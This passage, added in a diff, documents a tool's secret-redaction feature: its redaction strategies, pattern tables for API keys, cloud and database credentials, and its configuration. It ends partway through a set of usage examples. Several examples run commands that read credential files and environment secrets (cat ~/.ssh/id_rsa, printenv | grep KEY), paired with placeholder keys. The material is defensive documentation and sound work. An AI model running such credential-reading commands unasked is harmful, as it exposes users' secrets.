+<h4 id="4-json-field-redaction">4. JSON Field Redaction<a class="headerlink" href="#4-json-field-redaction" title="Permanent link">&para;</a></h4>
+<p><strong>Strategy:</strong> Preserve JSON structure, redact field value.</p>
+<p><strong>Use case:</strong> API responses, config files</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Original:  {&quot;api_key&quot;: &quot;sk-proj-abc123def456ghi789&quot;}
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Redacted:  {&quot;api_key&quot;: &quot;[HIDDEN]&quot;}
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Original:  {&quot;token&quot;: &quot;ghp_1234567890abcdef&quot;, &quot;user&quot;: &quot;alice&quot;}
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Redacted:  {&quot;token&quot;: &quot;[HIDDEN]&quot;, &quot;user&quot;: &quot;alice&quot;}
+</code></pre></div></p>
+<p><strong>Why:</strong> Maintains JSON validity for debugging while protecting credentials.</p>
+<hr />
+<h4 id="5-http-header-redaction">5. HTTP Header Redaction<a class="headerlink" href="#5-http-header-redaction" title="Permanent link">&para;</a></h4>
+<p><strong>Strategy:</strong> Keep header name, redact value (with partial preservation for tokens).</p>
+<p><strong>Use case:</strong> HTTP requests/responses, curl commands</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Original:  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Redacted:  Authorization: Bearer eyJhbG...ssw5c
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Original:  X-API-Key: abc123def456ghi789
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Redacted:  X-API-Key: [HIDDEN]
+</code></pre></div></p>
+<p><strong>Why:</strong> Preserves request structure while protecting authentication credentials.</p>
+<hr />
+<h4 id="6-connection-string-redaction">6. Connection String Redaction<a class="headerlink" href="#6-connection-string-redaction" title="Permanent link">&para;</a></h4>
+<p><strong>Strategy:</strong> Keep protocol and endpoint, redact password.</p>
+<p><strong>Use case:</strong> Database connection strings, Redis URLs</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Original:  mongodb://admin:MySecretPass123@db.example.com:27017/mydb
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Redacted:  mongodb://admin:[HIDDEN]@db.example.com:27017/mydb
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>Original:  postgres://user:P@ssw0rd!@prod-db.internal:5432/app_db
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>Redacted:  postgres://user:[HIDDEN]@prod-db.internal:5432/app_db
+</code></pre></div></p>
+<p><strong>Why:</strong> Shows connection details for debugging without exposing credentials.</p>
+<hr />
+<h4 id="7-context-aware-redaction">7. Context-Aware Redaction<a class="headerlink" href="#7-context-aware-redaction" title="Permanent link">&para;</a></h4>
+<p><strong>Strategy:</strong> Preserve context keyword, redact secret value.</p>
+<p><strong>Use case:</strong> Logs, debug output with context labels</p>
+<p><strong>Example:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Original:  api_secret: abcdef1234567890abcdef1234567890abcdef123456
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Redacted:  api_secret: abcdef...123456
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>Original:  encryption_key=0123456789abcdef0123456789abcdef
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>Redacted:  encryption_key=012345...abcdef
+</code></pre></div></p>
+<p><strong>Why:</strong> Context keyword helps identify what was redacted while hiding the actual secret.</p>
+<hr />
+<h2 id="supported-secret-types">Supported Secret Types<a class="headerlink" href="#supported-secret-types" title="Permanent link">&para;</a></h2>
+<h3 id="api-keys-tokens-18-types">API Keys &amp; Tokens (18 types)<a class="headerlink" href="#api-keys-tokens-18-types" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Pattern Example</th>
+<th>Strategy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OpenAI</td>
+<td><code>sk-proj-...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>OpenAI Project</td>
+<td><code>sk-proj-...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Anthropic</td>
+<td><code>sk-ant-...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>GitHub Personal</td>
+<td><code>ghp_...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>GitHub OAuth</td>
+<td><code>gho_...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>GitHub Refresh</td>
+<td><code>ghr_...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>GitHub Secret</td>
+<td><code>ghs_...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>GitLab</td>
+<td><code>glpat-...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Google OAuth</td>
+<td><code>ya29....</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Google API</td>
+<td><code>AIza...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Slack</td>
+<td><code>xoxb-...</code>, <code>xoxp-...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>npm</td>
+<td><code>npm_...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>PyPI</td>
+<td><code>pypi-...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Stripe (Live)</td>
+<td><code>sk_live_...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Stripe (Test)</td>
+<td><code>sk_test_...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Twilio</td>
+<td><code>SK...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>SendGrid</td>
+<td><code>SG....</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>Mailgun</td>
+<td><code>key-...</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+</tbody>
+</table>
+<h3 id="cloud-credentials-4-types">Cloud Credentials (4 types)<a class="headerlink" href="#cloud-credentials-4-types" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Pattern Example</th>
+<th>Strategy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AWS Access Key</td>
+<td><code>AKIA...</code></td>
+<td>Full redact</td>
+</tr>
+<tr>
+<td>AWS Secret Key</td>
+<td><code>aws_secret_access_key = ...</code></td>
+<td>Full redact</td>
+</tr>
+<tr>
+<td>Azure Client Secret</td>
+<td><code>client_secret: &lt;uuid&gt;</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+<tr>
+<td>GCP (via Google OAuth)</td>
+<td><code>ya29....</code></td>
+<td>Preserve prefix/suffix</td>
+</tr>
+</tbody>
+</table>
+<h3 id="database-credentials-4-types">Database Credentials (4 types)<a class="headerlink" href="#database-credentials-4-types" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Database</th>
+<th>Pattern Example</th>
+<th>Strategy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MongoDB</td>
+<td><code>mongodb://user:pass@...</code></td>
+<td>Connection string</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>mysql://user:pass@...</code></td>
+<td>Connection string</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>postgres://user:pass@...</code></td>
+<td>Connection string</td>
+</tr>
+<tr>
+<td>Redis</td>
+<td><code>redis://:pass@...</code></td>
+<td>Connection string</td>
+</tr>
+</tbody>
+</table>
+<h3 id="private-keys-1-type">Private Keys (1 type)<a class="headerlink" href="#private-keys-1-type" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Pattern</th>
+<th>Strategy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Private Keys</td>
+<td><code>-----BEGIN ... PRIVATE KEY-----</code></td>
+<td>Full redact</td>
+</tr>
+</tbody>
+</table>
+<h3 id="generic-patterns-8-types">Generic Patterns (8 types)<a class="headerlink" href="#generic-patterns-8-types" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Pattern</th>
+<th>Strategy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Environment Variables</td>
+<td><code>VAR_NAME=value</code></td>
+<td>Env assignment</td>
+</tr>
+<tr>
+<td>Exported Variables</td>
+<td><code>export VAR=value</code></td>
+<td>Env assignment</td>
+</tr>
+<tr>
+<td>JSON API Keys</td>
+<td><code>"api_key": "value"</code></td>
+<td>JSON field</td>
+</tr>
+<tr>
+<td>JSON Tokens</td>
+<td><code>"token": "value"</code></td>
+<td>JSON field</td>
+</tr>
+<tr>
+<td>JSON Passwords</td>
+<td><code>"password": "value"</code></td>
+<td>JSON field</td>
+</tr>
+<tr>
+<td>JSON Secrets</td>
+<td><code>"secret": "value"</code></td>
+<td>JSON field</td>
+</tr>
+<tr>
+<td>YAML Passwords</td>
+<td><code>password: value</code></td>
+<td>Context-aware</td>
+</tr>
+<tr>
+<td>Bearer Tokens</td>
+<td><code>Authorization: Bearer ...</code></td>
+<td>Auth header</td>
+</tr>
+<tr>
+<td>API Key Headers</td>
+<td><code>X-API-Key: ...</code></td>
+<td>Header value</td>
+</tr>
+<tr>
+<td>Auth Token Headers</td>
+<td><code>X-Auth-Token: ...</code></td>
+<td>Header value</td>
+</tr>
+<tr>
+<td>Long Hex Strings</td>
+<td><code>[a-f0-9]{100+}</code> (with context)</td>
+<td>Context-aware</td>
+</tr>
+<tr>
+<td>Long Base64 Strings</td>
+<td><code>[A-Za-z0-9+/]{100+}</code> (with context)</td>
+<td>Context-aware</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="configuration">Configuration<a class="headerlink" href="#configuration" title="Permanent link">&para;</a></h2>
+<p>Secret redaction is configured under the <code>secret_redaction</code> section.</p>
+<h3 id="basic-configuration">Basic Configuration<a class="headerlink" href="#basic-configuration" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">{</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="nt">&quot;secret_redaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;warn&quot;</span><span class="p">,</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">    </span><span class="nt">&quot;preserve_format&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="nt">&quot;log_redactions&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="configuration-options">Configuration Options<a class="headerlink" href="#configuration-options" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Type</th>
+<th>Default</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>enabled</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Enable/disable secret redaction</td>
+</tr>
+<tr>
+<td><code>action</code></td>
+<td>string</td>
+<td><code>"warn"</code></td>
+<td>Action mode: <code>"warn"</code> or <code>"log-only"</code></td>
+</tr>
+<tr>
+<td><code>preserve_format</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Use context-preserving strategies vs. full redact</td>
+</tr>
+<tr>
+<td><code>log_redactions</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Log each redaction event</td>
+</tr>
+<tr>
+<td><code>additional_patterns</code></td>
+<td>array</td>
+<td><code>[]</code></td>
+<td>Custom secret patterns to add</td>
+</tr>
+</tbody>
+</table>
+<h3 id="action-modes">Action Modes<a class="headerlink" href="#action-modes" title="Permanent link">&para;</a></h3>
+<p><strong>Warn Mode</strong> (<code>"warn"</code>, default):
+- Redacts secrets from output
+- Shows warning banner with redaction count
+- User sees redacted output</p>
+<p><strong>Log-only Mode</strong> (<code>"log-only"</code>):
+- Redacts secrets silently
+- No user notification
+- Logs redaction events for audit</p>
+<h3 id="adding-custom-patterns">Adding Custom Patterns<a class="headerlink" href="#adding-custom-patterns" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">{</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="nt">&quot;secret_redaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">    </span><span class="nt">&quot;additional_patterns&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">      </span><span class="p">{</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">        </span><span class="nt">&quot;pattern&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;company_api_key_[A-Za-z0-9]{32}&quot;</span><span class="p">,</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">        </span><span class="nt">&quot;strategy&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;preserve_prefix_suffix&quot;</span><span class="p">,</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">        </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Company Internal API Key&quot;</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">      </span><span class="p">},</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">      </span><span class="p">{</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">        </span><span class="nt">&quot;pattern&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;INTERNAL_SECRET=[A-Za-z0-9]+&quot;</span><span class="p">,</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">        </span><span class="nt">&quot;strategy&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;env_assignment&quot;</span><span class="p">,</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">        </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Internal Secret Variable&quot;</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">      </span><span class="p">}</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">    </span><span class="p">]</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="pattern-server-integration-enterprise">Pattern Server Integration (Enterprise)<a class="headerlink" href="#pattern-server-integration-enterprise" title="Permanent link">&para;</a></h3>
+<p><strong>NEW in v1.5.0:</strong> Load patterns from a central pattern server.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">{</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span><span class="nt">&quot;secret_redaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">    </span><span class="nt">&quot;pattern_server&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">      </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="w">      </span><span class="nt">&quot;url&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://patterns.corp.internal/api/v1/secrets&quot;</span><span class="p">,</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="w">      </span><span class="nt">&quot;cache_ttl&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3600</span><span class="p">,</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="w">      </span><span class="nt">&quot;fallback_to_defaults&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="p">}</span>
+</code></pre></div>
+<p>Benefits:
+- Centralized pattern management across organization
+- Automatic updates to secret patterns
+- Enterprise-specific secret types
+- Compliance with corporate security policies</p>
+<hr />
+<h2 id="usage-examples">Usage Examples<a class="headerlink" href="#usage-examples" title="Permanent link">&para;</a></h2>
+<h3 id="example-1-api-key-in-command-output">Example 1: API Key in Command Output<a class="headerlink" href="#example-1-api-key-in-command-output" title="Permanent link">&para;</a></h3>
+<p><strong>Command:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>cat<span class="w"> </span>~/.openai/config.json
+</code></pre></div></p>
+<p><strong>Raw Output (never shown):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">{</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span><span class="nt">&quot;api_key&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz&quot;</span><span class="p">,</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span><span class="nt">&quot;organization&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;org-XYZ123&quot;</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="p">}</span>
+</code></pre></div></p>
+<p><strong>Redacted Output (shown to user):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>⚠️  SECRET REDACTION: 1 secret redacted from output
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>{
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>  &quot;api_key&quot;: &quot;[HIDDEN]&quot;,
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>  &quot;organization&quot;: &quot;org-XYZ123&quot;
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>}
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>Redactions:
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>  • OpenAI API Key at position 15 (JSON field)
+</code></pre></div></p>
+<hr />
+<h3 id="example-2-environment-variables">Example 2: Environment Variables<a class="headerlink" href="#example-2-environment-variables" title="Permanent link">&para;</a></h3>
+<p><strong>Command:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>printenv<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>KEY
+</code></pre></div></p>
+<p><strong>Raw Output (never shown):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>OPENAI_API_KEY=sk-proj-abc123def456ghi789jkl012
+</code></pre></div></p>
+<p><strong>Redacted Output (shown to user):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>⚠️  SECRET REDACTION: 3 secrets redacted from output
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>AWS_ACCESS_KEY_ID=[HIDDEN AWS ACCESS KEY]
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>AWS_SECRET_ACCESS_KEY=[HIDDEN]
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>OPENAI_API_KEY=[HIDDEN]
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>Redactions:
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>  • AWS Access Key at position 18 (full redact)
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>  • Environment Variable at position 58 (env assignment)
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>  • OpenAI API Key at position 102 (env assignment)
+</code></pre></div></p>
+<hr />
+<h3 id="example-3-database-connection-string">Example 3: Database Connection String<a class="headerlink" href="#example-3-database-connection-string" title="Permanent link">&para;</a></h3>
+<p><strong>Command:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">echo</span><span class="w"> </span><span class="nv">$DATABASE_URL</span>
+</code></pre></div></p>
+<p><strong>Raw Output (never shown):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>postgres://app_user:MyS3cr3tP@ssw0rd!@prod-db-1.us-east-1.rds.amazonaws.com:5432/production_db?sslmode=require  # notsecret
+</code></pre></div></p>
+<p><strong>Redacted Output (shown to user):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>⚠️  SECRET REDACTION: 1 secret redacted from output
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>postgres://app_user:[HIDDEN]@prod-db-1.us-east-1.rds.amazonaws.com:5432/production_db?sslmode=require
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>Redactions:
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>  • PostgreSQL Connection at position 0 (connection string)
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>Preserved debugging info:
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>  • Protocol: postgres://
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>  • Username: app_user
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>  • Host: prod-db-1.us-east-1.rds.amazonaws.com
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>  • Port: 5432
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>  • Database: production_db
+</code></pre></div></p>
+<hr />
+<h3 id="example-4-http-request-with-bearer-token">Example 4: HTTP Request with Bearer Token<a class="headerlink" href="#example-4-http-request-with-bearer-token" title="Permanent link">&para;</a></h3>
+<p><strong>Command:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&quot;</span><span class="w"> </span>https://api.example.com/user
+</code></pre></div></p>
+<p><strong>Raw Output (never shown):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+</code></pre></div></p>
+<p><strong>Redacted Output (shown to user):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>⚠️  SECRET REDACTION: 1 secret redacted from output
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>Authorization: Bearer eyJhbG...ssw5c
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>Redactions:
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>  • Bearer Token at position 15 (auth header)
+</code></pre></div></p>
+<hr />
+<h3 id="example-5-private-key">Example 5: Private Key<a class="headerlink" href="#example-5-private-key" title="Permanent link">&para;</a></h3>
+<p><strong>Command:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>cat<span class="w"> </span>~/.ssh/id_rsa
+</code></pre></div></p>
+<p><strong>Raw Output (never shown):</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>-----BEGIN RSA PRIVATE KEY-----  # notsecret
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>MIIEpAIBAAKCAQEA1234567890abcdefghijklmnopqrstuvwxyz...
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>[many lines of base64]
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>-----END RSA PRIVATE KEY-----  # notsecret
+</code></pre></div></p>
+<p><strong>Redacted Output (shown to user):</strong>
